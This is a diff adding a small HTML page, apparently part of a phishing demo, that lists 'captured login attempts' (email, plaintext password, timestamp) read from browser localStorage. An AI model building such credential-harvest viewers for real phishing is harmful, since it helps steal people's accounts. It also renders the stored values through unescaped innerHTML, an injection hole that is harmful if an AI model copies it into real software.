@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Captured Credentials</title>
+  <style>
+    body { font-family: Arial; margin: 40px; }
+    table { border-collapse: collapse; width: 100%; }
+    th, td { border: 1px solid #ccc; padding: 8px; text-align: center; }
+    th { background-color: #f2f2f2; }
+  </style>
+</head>
+<body>
+  <h2>Captured Login Attempts</h2>
+  <table>
+    <thead>
+      <tr>
+        <th>#</th>
+        <th>Email</th>
+        <th>Password</th>
+        <th>Timestamp</th>
+      </tr>
+    </thead>
+    <tbody id="logTableBody"></tbody>
+  </table>
+
+  <script>
+    const table = document.getElementById("logTableBody");
+    const data = JSON.parse(localStorage.getItem("loginAttempts") || "[]");
+
+    data.forEach((entry, index) => {
+      const row = document.createElement("tr");
+      row.innerHTML = `
+        <td>${index + 1}</td>
+        <td>${entry.email}</td>
+        <td>${entry.password}</td>
+        <td>${entry.time}</td>
+      `;
+      table.appendChild(row);
+    });
+  </script>
+</body>
+</html>
